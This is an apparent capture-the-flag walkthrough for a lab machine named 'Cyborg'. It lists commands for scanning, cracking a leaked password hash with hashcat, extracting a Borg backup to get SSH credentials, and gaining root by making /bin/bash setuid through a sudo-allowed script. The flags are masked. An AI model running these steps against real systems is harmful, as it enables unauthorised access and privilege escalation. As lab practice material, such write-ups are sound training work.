# Cyborg

- Deploy the machine

	  no answer needed

- Scan the machine, how many ports are open?

	- `scilla port -target <TARGET_IP>`
	- `*`

- What service is running on port 22?

	- `ssh`

- What service is running on port 80?

	- `http`

- What is the user.txt flag?

	- Go to `<TARGET_IP>/etc`
	- And you find `http://<TARGET_IP>/etc/squid/passwd`
	- So you have found something like `username:password`.
	- `hash-identifier` and paste the password.
	- `echo password > hash`
	- `hashcat --force -m 1600 -a 0 hash /home/kali/rockyou.txt`
	- `ssh username@<TARGET_IP>` and enter the password.
	- It seems a password file...
	- `scilla dir -target <TARGET_IP>`
	- `/admin/` found!
	- Go to admin page and download the archive.tar file.
	- `tar -xvf archive.tar`
	- This is a [Borg](https://borgbackup.readthedocs.io/en/stable/) things.
	- Install borg.
	- `borg extract archive.tar::music_archive`
	- You found the ssh credentials.
	- `ssh ****@<TARGET_IP>` and enter the password.
	- `cat user.txt`
	- `flag{************************************}`

- What is the root.txt flag?

	- `sudo -l`
	- `cat /etc/mp3backups/backup.sh`
	- `sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"`
	- `bash -p`
	- `cat /root/root.txt`
	- `flag{***********************************}`
